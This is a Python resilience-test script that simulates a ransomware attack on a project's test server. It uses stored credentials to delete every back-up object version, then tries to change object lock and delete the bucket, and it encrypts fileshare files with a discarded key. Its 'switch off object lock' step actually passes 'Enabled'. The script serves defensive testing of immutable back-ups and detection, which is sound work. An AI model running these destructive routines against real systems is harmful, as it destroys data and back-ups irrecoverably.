#!/usr/bin/env python3
"""TransLog ransomware TEST script - NOT real malware. It only touches the TransLog test data on app01 and
the TransLog back-up bucket, and only when started with --ik-weet-het-zeker.

It imitates two techniques from MITRE ATT&CK, like a real attacker who has taken over app01 (root):
  1. T1490 Inhibit System Recovery: with the back-up login found on app01, try to delete or overwrite every
     back-up on backup01 (all object versions), switch off the object lock and delete the bucket.
     With object lock (COMPLIANCE) all of this must FAIL (requirement E1).
  2. T1486 Data Encrypted for Impact: encrypt the files in the fileshare (*.locked) and leave a note.
     Zabbix must report this within 5 minutes (E12); the portal shows it too.

Every step is written with a timestamp to /var/log/translog-attack.log, so detection and recovery times
can be measured. Undo the encryption by restoring from back-up (translog-restore), as after a real attack.

  translog-attack-sim --ik-weet-het-zeker              both steps
  translog-attack-sim --ik-weet-het-zeker --only backups
  translog-attack-sim --ik-weet-het-zeker --only encrypt
"""
import argparse
import json
import os
import socket
import sys
import time
from pathlib import Path

LOG = Path("/var/log/translog-attack.log")
FILESHARE = Path("/srv/fileshare")


def log(msg):
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}"
    print(line, flush=True)
    with LOG.open("a") as f:
        f.write(line + "\n")


def attack_backups():
    import boto3
    from botocore.config import Config
    from botocore.exceptions import ClientError
    cfg = json.loads(Path("/etc/translog/backup.json").read_text())
    s3 = boto3.client("s3", endpoint_url=f"http://{cfg['endpoint']}", aws_access_key_id=cfg["access_key"],
                      aws_secret_access_key=cfg["secret_key"], region_name="us-east-1",
                      config=Config(s3={"addressing_style": "path"}))
    bucket = cfg["bucket"]
    log(f"T1490 start: trying to destroy the back-ups in bucket {bucket}")
    versions = []
    for page in s3.get_paginator("list_object_versions").paginate(Bucket=bucket):
        versions += [(v["Key"], v["VersionId"]) for v in page.get("Versions", [])]
    log(f"T1490 found {len(versions)} object versions")
    deleted = refused = 0
    for key, vid in versions:
        try:
            s3.delete_object(Bucket=bucket, Key=key, VersionId=vid)
            deleted += 1
        except ClientError:
            refused += 1
    log(f"T1490 delete every version: {deleted} deleted, {refused} refused")

    overwritten = 0
    for key, _ in versions[:20]:
        try:
            s3.put_object(Bucket=bucket, Key=key, Body=b"encrypted by ransomware")
            overwritten += 1
        except ClientError:
            pass
    log(f"T1490 overwrite 20 objects: {overwritten} new versions written (old versions stay locked)")

    for what, call in [("switch off object lock", lambda: s3.put_object_lock_configuration(
                            Bucket=bucket, ObjectLockConfiguration={"ObjectLockEnabled": "Enabled"})),
                       ("delete the bucket", lambda: s3.delete_bucket(Bucket=bucket))]:
        try:
            call()
            log(f"T1490 {what}: SUCCEEDED (bad)")
        except ClientError as e:
            log(f"T1490 {what}: refused ({e.response['Error'].get('Code')})")
    ok = deleted == 0
    log("T1490 result: back-ups " + ("SAFE - nothing could be deleted (E1 met)" if ok else f"NOT SAFE - {deleted} deleted"))
    return ok


def encrypt_files():
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()          # thrown away, like a real attacker would keep it
    f = Fernet(key)
    files = [p for p in FILESHARE.rglob("*") if p.is_file() and p.suffix != ".locked" and p.name != ".testdata"]
    log(f"T1486 start: encrypting {len(files)} files in {FILESHARE}")
    for p in files:
        data = p.read_bytes()
        p.with_name(p.name + ".locked").write_bytes(f.encrypt(data))
        p.unlink()
    (FILESHARE / "LEESMIJ-JE-BESTANDEN-ZIJN-VERSLEUTELD.txt").write_text(
        "TEST - dit is een oefening van het TransLog-project. Herstel met translog-restore.\n")
    log(f"T1486 done: {len(files)} files encrypted")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--ik-weet-het-zeker", action="store_true", help="really run the test")
    ap.add_argument("--only", choices=["backups", "encrypt"])
    a = ap.parse_args()
    if socket.gethostname() != "app01" or os.geteuid() != 0:
        sys.exit("Only for app01, as root.")
    if not a.ik_weet_het_zeker:
        sys.exit("This encrypts the TransLog test files. Start with --ik-weet-het-zeker")
    log("=== attack test started")
    if a.only in (None, "backups"):
        attack_backups()
    if a.only in (None, "encrypt"):
        encrypt_files()
    log("=== attack test finished; restore with: translog-restore --before \"<time before the test>\"")


if __name__ == "__main__":
    main()
